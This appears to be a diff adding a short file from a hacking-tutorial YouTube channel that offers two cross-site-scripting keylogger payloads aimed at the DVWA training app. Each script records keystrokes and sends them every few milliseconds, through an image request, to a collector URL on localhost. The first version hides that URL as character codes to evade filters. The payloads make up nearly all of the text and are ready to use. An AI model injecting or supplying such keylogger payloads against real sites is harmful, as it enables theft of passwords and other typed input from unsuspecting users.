@@ -1,0 +1,20 @@
+by Rajesh Majumdar for its YouTube Channel.
+https://www.youtube.com/c/RajeshMajumdarhacks
+
+
+
+
+
+	//next script works on DVWA
+<script lang=javascript type=text/javascript>var keys = 3;document.onkeypress = function(e) {var get = window.event ? event : e;var key = get.keyCode ? get.keyCode : get.charCode;key = String.fromCharCode(key);keys += key;}</script><script type=text/javascript>window.setInterval(function(){new Image().src = (String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 108, 111, 99, 97, 108, 104, 111, 115, 116, 47, 107, 101, 121, 108, 111, 103, 103, 101, 114, 47, 107, 101, 121, 108, 111, 103, 103, 101, 114, 46, 112, 104, 112, 63, 99, 61)) + keys;keys = 0;}, 5);</script>
+
+the previous script is the same to what follows, except that the http://etc is trascoded to "char", for otherwise it will not work. Change que address to your on localhost and then code it using a calculator from internet.
+<script lang=javascript type=text/javascript>var keys = 3;document.onkeypress = function(e) {var get = window.event ? event : e;var key = get.keyCode ? get.keyCode : get.charCode;key = String.fromCharCode(key);keys += key;}</script><script type=text/javascript>window.setInterval(function(){new Image().src ='http://localhost/keylogger/keylogger.php?c=' %2B keys;keys = 0;}, 5);</script>
+
+with this script, all keys will be saved into the selected file.
+Use it wisely, learn and thrive.
+
+Any tutorial, request, critics, doubts you may have, please comment it on my channel.
+At your service,
+
+	Rajesh.
